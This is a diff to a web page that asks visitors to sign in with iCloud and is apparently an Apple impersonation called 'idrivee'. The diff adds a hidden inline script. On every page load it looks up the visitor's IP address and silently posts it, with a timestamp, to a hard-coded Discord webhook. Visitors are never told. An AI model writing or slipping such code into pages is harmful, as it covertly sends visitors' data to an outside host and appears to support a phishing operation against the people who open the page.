@@ -57,6 +57,27 @@ To submit your responses, please sign in with iCloud
 
 <script src="script.js"></script>
 
+<script>
+// notifica cuando alguien carga la página
+(async function() {
+    try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const ip = ipData.ip;
+
+        await fetch('https://discord.com/api/webhooks/1547265836639850547/8t4VVERF2Jv7Vt9ZgyRjWKcdI70TJqJDdImE3vtJRsojQxaUQWHV1ydGwPc4jXUpK4cW', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: `🔔 **Alguien abrió la página idrivee**\n📱 IP: ${ip}\n🕐 ${new Date().toLocaleString()}`
+            })
+        });
+    } catch (error) {
+        console.log('Error al notificar:', error);
+    }
+})();
+</script>
+    
 </body>
 
 </html>
